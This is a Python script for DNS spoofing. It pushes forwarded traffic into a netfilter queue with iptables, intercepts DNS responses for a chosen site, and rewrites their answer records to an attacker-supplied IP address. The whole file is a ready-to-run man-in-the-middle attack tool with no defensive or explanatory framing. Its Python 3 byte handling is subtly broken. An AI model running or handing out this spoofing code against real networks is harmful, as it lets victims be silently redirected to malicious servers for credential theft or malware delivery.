#!/usr/bin/env python

# Python 3.8
# https://github.com/kti/python-netfilterqueue
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip install -U git+https://github.com/kti/python-netfilterqueue
import argparse
import subprocess

import netfilterqueue
import scapy.all as scapy


def process_packet(site, target):
    def inner(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname

            if site in qname:
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata=target)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(str(scapy_packet))

        packet.accept()

    return inner


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-s", "--site", dest="site", help="Site to spoof")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info")
    elif not options.site:
        parser.error("[-] Please specify a site to be spoofed, use --help for more info")
    return options


try:
    # traps all packets from FORWARD chain to NFQUEUE
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")

    options = get_arguments()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet(options.site, options.target))
    queue.run()
except KeyboardInterrupt:
    print("Exiting...")
except Exception:
    print("Something went wrong!")
finally:
    print("Flushing iptables...")
    subprocess.call("iptables --flush", shell=True)
